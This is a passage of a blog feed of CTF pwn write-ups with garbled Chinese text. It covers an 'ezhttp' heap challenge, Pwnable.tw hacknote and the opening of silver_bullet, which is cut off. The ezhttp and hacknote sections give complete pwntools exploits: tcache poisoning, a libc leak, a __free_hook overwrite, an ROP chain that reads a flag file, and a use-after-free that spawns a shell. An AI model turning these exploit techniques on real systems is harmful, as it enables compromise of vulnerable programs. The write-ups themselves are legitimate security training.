å¯„å­˜å™¨(rdi&#x3D;0,rsi&#x3D;heap+0xa0,rdx&#x3D;0x200)ï¼Œrspæ”¹åˆ°heap+0xa8ï¼Œä¹‹åè¿”å›æ—¶å»æ‰§è¡Œreadè¯»å…¥åç»­çš„shellcodeåˆ°æ ˆé‡Œé¢rspä½ç½®ç„¶åretåˆ°shellcodeæ¥orwã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x555556d1f320</span><br><span class="line">00:0000â”‚   0x555556d1f320 â—‚â€” 0x67616c662f2e /* &#x27;./flag&#x27; */</span><br><span class="line">01:0008â”‚   0x555556d1f328 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope 0x555556d1f320 100</span><br><span class="line">00:0000â”‚      0x555556d1f320 â—‚â€” 0x67616c662f2e /* &#x27;./flag&#x27; */</span><br><span class="line">01:0008â”‚      0x555556d1f328 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">0e:0070â”‚      0x555556d1f390 â€”â–¸ 0x555556d1f3c0 â€”â–¸ 0x7fb514444a78 (mblen+104) â—‚â€” pop    rax</span><br><span class="line">0f:0078â”‚      0x555556d1f398 â€”â–¸ 0x555556d21000 â—‚â€” 0x0</span><br><span class="line">10:0080â”‚      0x555556d1f3a0 â—‚â€” 0x200</span><br><span class="line">... â†“</span><br><span class="line">12:0090â”‚      0x555556d1f3b0 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">14:00a0â”‚ rsi  0x555556d1f3c0 â€”â–¸ 0x7fb514444a78 (mblen+104) â—‚â€” pop    rax</span><br><span class="line">... â†“</span><br><span class="line">17:00b8â”‚      0x555556d1f3d8 â—‚â€” 0x0</span><br><span class="line">18:00c0â”‚      0x555556d1f3e0 â€”â–¸ 0x7fb5144d39d5 (__time_syscall+5) â—‚â€” syscall</span><br><span class="line">19:00c8â”‚ rsp  0x555556d1f3e8 â—‚â€” 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========\n&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /create Cookie: user[^=admin token: \r\r\n\r\ncontent=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========\n&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /del Cookie: user[^=admin token: \r\r\n\r\nindex=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========\n&quot;</span>)</span><br><span class="line">p.send((<span class="string">&#x27;POST /edit Cookie: user[^=admin  token: \r\r\n\r\nindex=&#123;0&#125;&amp;content=&#123;1&#125;&amp;&#x27;</span>).<span class="built_in">format</span>(idx,content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /create Cookie: user[^=admin token: \r\r\n\r\ncontent=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele2</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /del Cookie: user[^=admin token: \r\r\n\r\nindex=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">idx,content</span>):</span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========&quot;</span>)</span><br><span class="line">p.send((<span class="string">&#x27;POST /edit Cookie: user[^=admin  token: \r\r\n\r\nindex=&#123;0&#125;&amp;content=&#123;1&#125;&amp;&#x27;</span>).<span class="built_in">format</span>(idx,content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">55504</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">    p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process([<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>,<span class="string">&quot;./ezhttp&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># p=process(&quot;./ezhttp&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your gift: &quot;</span>)</span><br><span class="line">heap=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">add(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># dele(1)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># debug(0x0000000000019E3)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap-<span class="number">0x250</span>)[:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">4</span>,p8(<span class="number">0x1</span>)*<span class="number">0x40</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap+<span class="number">0xa0</span>+<span class="number">0x20</span>)[:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">stdout=<span class="built_in">int</span>(raw_input(<span class="string">&#x27;input: &#x27;</span>),<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">8</span>,p16(stdout)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># add(&#x27;a&#x27;*0x40)</span></span><br><span class="line"><span class="comment"># debug(0x0001A78)</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>+p32(<span class="number">0xfbad1801</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> +<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;a&#x27;*0x1f)</span></span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ec761</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">edit2(<span class="number">11</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> +p8(<span class="number">0xc8</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">dele2(<span class="number">0</span>)</span><br><span class="line">edit2(<span class="number">2</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x38</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add2(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add2(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(libc.address+<span class="number">0x52145</span>)[:<span class="number">6</span>])</span><br><span class="line">edit2(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap -= <span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">p_rdi = <span class="number">0x2155f</span>+libc.address</span><br><span class="line">p_rdx_rsi = <span class="number">0x130889</span>+libc.address</span><br><span class="line">p_rax = <span class="number">0x43a78</span>+libc.address</span><br><span class="line">syscall_ret = <span class="number">0xd29d5</span>+libc.address</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;./flag&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">12</span><span class="comment">#offset 0x68</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap+<span class="number">0x320</span>+<span class="number">0xa0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(heap+<span class="number">0x2000</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)*<span class="number">2</span><span class="comment">#rbx and rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap+<span class="number">0x320</span>+<span class="number">0xa8</span>)<span class="comment"># rsp</span></span><br><span class="line">payload += p64(p_rax)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(p_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">edit2(<span class="number">8</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele2(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">rop_chain = [</span><br><span class="line">p_rdi,heap+<span class="number">0x320</span>,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,p_rax,<span class="number">2</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">4</span>,p_rdx_rsi,<span class="number">0x100</span>,heap+<span class="number">0x2000</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">1</span>,p_rax,<span class="number">1</span>,syscall_ret</span><br><span class="line">]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x28</span>+flat(rop_chain))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>libcä½¿ç”¨çš„æ—¶glibc all in oneé‡Œé¢çš„ï¼Œdownloadæ—¶å€™ä¹Ÿä¸€èµ·æŠŠdbgç¬¦å·ä¸€èµ·ä¸‹è½½äº†ï¼Œä¹‹åç¼–è¯‘ä¸€ä¸‹å°±èƒ½ç”¨äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw hacknote</title>
      <link href="/2020/10/17/Pwnable_hacknote/"/>
      <url>/2020/10/17/Pwnable_hacknote/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-hacknote"><a href="#Pwnable-tw-hacknote" class="headerlink" title="Pwnable.tw  hacknote"></a>Pwnable.tw  hacknote</h3><blockquote><p>ç®€å•èœå•é¢˜ï¼Œæä¾›äº†ä¸€ç§åˆ©ç”¨æ€è·¯</p></blockquote><span id="more"></span><p>ç¨‹åºçš„ç‹¬ç‰¹ä¹‹å¤„åœ¨äºåœ¨mallocæ–°å †ä¹‹å‰ä¼šå…ˆmalloc(8)ï¼ˆæˆ‘å°±ç§°å®ƒä¸ºleadï¼‰è¿‡æ¥å­˜æ”¾putsçš„å‡½æ•°æŒ‡é’ˆå’Œè§£ä¸‹æ¥mallocå¾—åˆ°çš„ptr</p><p>show()å‡½æ•°åˆ™æ˜¯é€šè¿‡è°ƒç”¨è¯¥ä½ç½®çš„å‡½æ•°æŒ‡é’ˆæ¥è¿›è¡Œæ‰“å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= numbers )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  (*ptr[v1])(ptr[v1]);</span><br></pre></td></tr></table></figure><p>æ˜¾è€Œæ˜“è§ï¼Œåªè¦ä¿®æ”¹å­˜åœ¨ä¸å †ä¸Šçš„å‡½æ•°æŒ‡é’ˆä¸ºsystemï¼Œå†showå³å¯å®Œæˆåˆ©ç”¨ã€‚<br>ç¨‹åºè¿˜å­˜åœ¨UAFï¼Œå¯¹æˆ‘ä»¬æ¥è¯´æ˜¯ä¸ªå¥½æ¶ˆæ¯ã€‚</p><p>å…ˆåˆ©ç”¨å †åˆ†é…å¾—åˆ°chunk0å¯¹åº”çš„leadï¼Œæ”¹heap_pträ¸ºprintf_gotï¼Œshow(0)å¾—åˆ°libcåœ°å€ï¼Œç„¶ååŒæ ·æ–¹æ³•å¾—åˆ°leadï¼Œæ”¹putsçš„å‡½æ•°æŒ‡é’ˆä¸ºsystem,heap_pträ¸ºâ€||shâ€,â€™||â€™ç”¨æ¥äºå®Œæˆå‚æ•°çš„æˆªæ–­ï¼Œä¹‹åshowæ‹¿åˆ°shellğŸš©</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">r=process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10102</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Note size :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862B</span>)+p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_address=u32(r.recv(<span class="number">4</span>))-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=libc_address+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libc_address+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(system)+<span class="string">&#x27;||sh&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p>200åˆ†çš„é¢˜ç›¸å¯¹å®¹æ˜“ç‚¹ï¼Œåé¢å°±éš¾èµ·æ¥äº†ğŸŒ©</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw silver_bullet</title>
      <link href="/2020/10/17/Pwnable_silver_bullet/"/>
      <url>/2020/10/17/Pwnable_silver_bullet/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-silver-bullet"><a href="#Pwnable-tw-silver-bullet" class="headerlink" title="Pwnable.tw silver_bullet"></a>Pwnable.tw silver_bullet</h3><blockquote><p>å¥½ä¹…ä¹‹å‰åšè¿‡ä¸€æ¬¡ï¼Œå½“æ—¶ä¸æ€ä¹ˆä¼šè°ƒï¼Œæ ˆæ„é€ çš„ä¹±ä¸ƒå…«ç³Ÿçš„ï¼Œç°åœ¨å†æ¥åšæ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹ä¸œè¥¿çš„ğŸ˜‚</p></blockquote><span id="more"></span><p>è¿™é¢˜å¤§æ¦‚æµç¨‹å°±æ˜¯å…ˆcreate_bulletï¼Œå†å¢åŠ powerï¼Œæœ€åå»æŒ‘æˆ˜boss(HP&#x3D;0x7f000000),æˆåŠŸå°±é€€å‡ºäº†ï¼Œå•Šè¿™</p><p>ç¨‹åºçš„æ¼æ´ç‚¹åœ¨power_upï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">power_up</span><span class="params">(<span class="type">char</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-34h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);     <span class="comment">//è¿™é‡Œçš„destæ˜¯å°±æ˜¯æˆ‘æ‰€è¯´çš„mainå‡½æ•°sï¼Œè€Œè¿™é‡Œçš„såªæ˜¯è¿™ä¸ªå‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</span></span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need create the bullet first !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">0xC</span>) &gt; <span class="number">47u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t power up any more !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your another description of bullet :&quot;</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  <span class="built_in">strncat</span>(dest, &amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new power is : %u\n&quot;</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enjoy it !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strncatå‡½æ•°åœ¨æ‰§è¡Œå®Œæ‹¼æ¥åä¼šåœ¨æœ«å°¾åŠ 